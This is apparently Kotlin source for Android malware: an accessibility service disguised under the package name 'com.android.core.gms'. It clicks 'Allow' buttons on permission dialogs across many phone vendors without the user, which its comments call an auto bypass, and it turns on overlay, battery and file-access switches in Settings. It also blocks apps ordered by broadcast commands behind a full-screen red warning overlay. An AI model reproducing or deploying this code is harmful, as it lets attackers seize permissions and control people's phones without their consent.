package com.android.core.gms

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.widget.Toast
import android.content.pm.PackageManager
import android.view.accessibility.AccessibilityNodeInfo

class AppBlockerService : AccessibilityService() {

    companion object {
        var instance: AppBlockerService? = null
        val blockedPackages = mutableSetOf<String>()

        fun isEnabled(ctx: Context): Boolean {
            val enabledServices = android.provider.Settings.Secure.getString(
                ctx.contentResolver,
                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            val component = "${ctx.packageName}/.AppBlockerService"
            val componentFull = "${ctx.packageName}/${ctx.packageName}.AppBlockerService"
            return enabledServices.split(":").any { svc ->
                svc.equals(component, ignoreCase = true) ||
                svc.equals(componentFull, ignoreCase = true)
            }
        }

        fun isUsageAccessGranted(ctx: Context): Boolean {
            return try {
                val appOps = ctx.getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
                val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    appOps.unsafeCheckOpNoThrow(
                        android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                        android.os.Process.myUid(), ctx.packageName
                    )
                } else {
                    @Suppress("DEPRECATION")
                    appOps.checkOpNoThrow(
                        android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                        android.os.Process.myUid(), ctx.packageName
                    )
                }
                mode == android.app.AppOpsManager.MODE_ALLOWED
            } catch (e: Exception) { false }
        }
    }

    private val mainHandler = Handler(Looper.getMainLooper())
    private var lastBlockedPkg = ""
    private var lastBlockTime = 0L

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            when (intent.action) {
                "com.android.core.gms.BLOCK_APP" -> {
                    val pkg = intent.getStringExtra("package") ?: return
                    blockedPackages.add(pkg)
                    android.util.Log.d("AppBlocker", "Blocked: $pkg")
                }
                "com.android.core.gms.UNBLOCK_APP" -> {
                    val pkg = intent.getStringExtra("package") ?: return
                    blockedPackages.remove(pkg)
                    android.util.Log.d("AppBlocker", "Unblocked: $pkg")
                }
                "com.android.core.gms.UNBLOCK_ALL" -> {
                    blockedPackages.clear()
                    android.util.Log.d("AppBlocker", "All unblocked")
                }
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this

        serviceInfo = serviceInfo.apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                         AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            notificationTimeout = 50L
        }

        val filter = IntentFilter().apply {
            addAction("com.android.core.gms.BLOCK_APP")
            addAction("com.android.core.gms.UNBLOCK_APP")
            addAction("com.android.core.gms.UNBLOCK_ALL")
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }
        android.util.Log.d("AppBlocker", "Service connected")
    }

    // ── Packages izin runtime di semua vendor ──────────────────────────────
    private val PERM_PKGS = setOf(
        "com.android.packageinstaller",
        "com.android.permissioncontroller",
        "com.google.android.permissioncontroller",
        "com.miui.securitycenter",
        "com.coloros.safecenter",
        "com.vivo.permissionmanager",
        "com.samsung.android.permissioncontroller",
        "com.lge.permissioncontroller",
        "com.huawei.systemmanager"
    )

    // ── Kata kunci tombol Allow/Izinkan di semua bahasa Android ──────────
    private val ALLOW_KEYWORDS = listOf(
        "izinkan", "allow", "grant", "permit",
        "izinkan saja kali ini", "only this time",
        "saat menggunakan aplikasi", "while using the app",
        "izinkan setiap saat", "always allow",
        "aktifkan", "enable", "ok", "ya", "yes",
        "lanjutkan", "continue", "setuju", "agree",
        "izinkan semua", "allow all"
    )

    private var lastAutoClickPkg = ""
    private var lastAutoClickTime = 0L

    // ── Auto-click semua tombol "Izinkan/Allow" pada dialog permission ─────
    private fun tryAutoClickAllow(): Boolean {
        val root = rootInActiveWindow ?: return false
        var clicked = false
        for (keyword in ALLOW_KEYWORDS) {
            val nodes = root.findAccessibilityNodeInfosByText(keyword)
            for (node in nodes) {
                if (node.isClickable && node.isEnabled) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    android.util.Log.d("AppBlocker", "AutoClick: '$keyword'")
                    clicked = true
                    break
                }
                // coba parent clickable
                var parent = node.parent
                repeat(3) {
                    if (parent != null && parent.isClickable && parent.isEnabled) {
                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        android.util.Log.d("AppBlocker", "AutoClick parent: '$keyword'")
                        clicked = true
                    }
                    parent = parent?.parent
                }
                if (clicked) break
            }
            if (clicked) break
        }
        return clicked
    }

    // ── Auto-click toggle switch di Settings (untuk overlay, battery, dll) ─
    private fun tryAutoClickSwitch(): Boolean {
        val root = rootInActiveWindow ?: return false
        val switches = root.findAccessibilityNodeInfosByViewId("android:id/switch_widget")
            .ifEmpty { root.findAccessibilityNodeInfosByViewId("com.android.settings:id/switch_widget") }
        for (sw in switches) {
            if (!sw.isChecked && sw.isClickable && sw.isEnabled) {
                sw.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                android.util.Log.d("AppBlocker", "AutoClick switch")
                return true
            }
        }
        return false
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        val eventType = event?.eventType ?: return
        val pkg = event.packageName?.toString() ?: return
        if (pkg == packageName) return

        // ── AUTO BYPASS: klik "Izinkan/Allow" pada semua dialog permission ─
        val now = System.currentTimeMillis()
        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {

            if (pkg in PERM_PKGS || pkg == "android") {
                // Anti-spam: max 1x per 500ms per package
                if (!(pkg == lastAutoClickPkg && now - lastAutoClickTime < 500L)) {
                    lastAutoClickPkg = pkg
                    lastAutoClickTime = now
                    mainHandler.postDelayed({ tryAutoClickAllow() }, 120L)
                }
            }

            // Auto-click switch di Settings (untuk overlay permission, battery, all files)
            if (pkg == "com.android.settings" || pkg == "com.miui.securitycenter" ||
                pkg == "com.samsung.android.settings") {
                mainHandler.postDelayed({ tryAutoClickSwitch() }, 250L)
            }
        }

        if (eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
        if (pkg == "android") return
        if (pkg == "com.android.systemui") return

        if (!blockedPackages.contains(pkg)) return

        // Anti spam
        if (pkg == lastBlockedPkg && now - lastBlockTime < 1000) return
        lastBlockedPkg = pkg
        lastBlockTime  = now

        val appName = try {
            val pm = packageManager
            pm.getApplicationLabel(
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                    pm.getApplicationInfo(pkg, PackageManager.ApplicationInfoFlags.of(0))
                else
                    @Suppress("DEPRECATION") pm.getApplicationInfo(pkg, 0)
            ).toString()
        } catch (e: Exception) { pkg }

        mainHandler.post { showBlockOverlay(appName) }
    }

    private var blockOverlayView: android.view.View? = null
    private val blockOverlayHandler = Handler(Looper.getMainLooper())

    private fun showBlockOverlay(appName: String) {
        removeBlockOverlay()
        if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.M ||
            !android.provider.Settings.canDrawOverlays(this)) {
            performGlobalAction(GLOBAL_ACTION_HOME)
            return
        }
        val wm = getSystemService(WINDOW_SERVICE) as android.view.WindowManager
        val wv = android.webkit.WebView(this).apply {
            settings.javaScriptEnabled = true
            settings.loadWithOverviewMode = true
            settings.useWideViewPort = true
            isClickable = true
            setOnTouchListener { _, _ -> true }
        }
        val safeName = appName.replace("&","&amp;").replace("<","&lt;")
        val html = buildBlockHtml(safeName)
        wv.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null)
        val type = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O)
            android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        else @Suppress("DEPRECATION") android.view.WindowManager.LayoutParams.TYPE_PHONE
        val params = android.view.WindowManager.LayoutParams(
            android.view.WindowManager.LayoutParams.MATCH_PARENT,
            android.view.WindowManager.LayoutParams.MATCH_PARENT,
            type,
            android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            android.view.WindowManager.LayoutParams.FLAG_FULLSCREEN,
            android.graphics.PixelFormat.OPAQUE
        )
        try {
            wm.addView(wv, params)
            blockOverlayView = wv
            blockOverlayHandler.postDelayed({ removeBlockOverlay() }, 4000)
        } catch (_: Exception) { performGlobalAction(GLOBAL_ACTION_HOME) }
    }

    private fun buildBlockHtml(appName: String): String = """<!DOCTYPE html>
<html><head>
<meta name='viewport' content='width=device-width,initial-scale=1,maximum-scale=1'>
<link href='https://fonts.googleapis.com/css2?family=Creepster&display=swap' rel='stylesheet'>
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{height:100%;background:#000;display:flex;flex-direction:column;
  align-items:center;justify-content:center;overflow:hidden}
img.logo{width:110px;height:110px;object-fit:contain;margin-bottom:24px;
  animation:pulse 2s ease-in-out infinite;
  filter:drop-shadow(0 0 14px rgba(255,0,0,.9)) drop-shadow(0 0 35px rgba(200,0,0,.6))}
@keyframes pulse{0%,100%{filter:drop-shadow(0 0 12px rgba(255,0,0,.7)) drop-shadow(0 0 28px rgba(180,0,0,.5))}
  50%{filter:drop-shadow(0 0 24px rgba(255,0,0,1)) drop-shadow(0 0 55px rgba(200,0,0,.8))}}
.title{font-family:'Creepster',cursive;font-size:28px;color:#ff0000;
  text-align:center;letter-spacing:2px;margin-bottom:12px;
  text-shadow:0 0 20px rgba(255,0,0,.8),2px 2px 0 #550000}
.sub{font-family:monospace;font-size:12px;color:#cc0000;letter-spacing:1px;
  text-align:center;padding:0 28px;line-height:1.7}
.app{color:#ff4444;font-weight:bold;display:block;font-size:14px;margin-top:6px}
body::before{content:'';position:fixed;inset:0;pointer-events:none;
  background:radial-gradient(ellipse at 50% 30%,rgba(180,0,0,.15),transparent 60%)}
</style></head><body>
<img class='logo' src='https://files.catbox.moe/puneo5.png' onerror="this.style.display='none'" alt=''>
<div class='title'>APK DI BLOCK SISTEM</div>
<div class='sub'>Aplikasi ini telah diblokir<span class='app'>$appName</span></div>
</body></html>"""

    private fun removeBlockOverlay() {
        blockOverlayHandler.removeCallbacksAndMessages(null)
        val v = blockOverlayView ?: return
        blockOverlayView = null
        try { (getSystemService(WINDOW_SERVICE) as android.view.WindowManager).removeView(v) } catch (_: Exception) {}
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        super.onDestroy()
        removeBlockOverlay()
        try { unregisterReceiver(commandReceiver) } catch (_: Exception) {}
        instance = null
    }
}
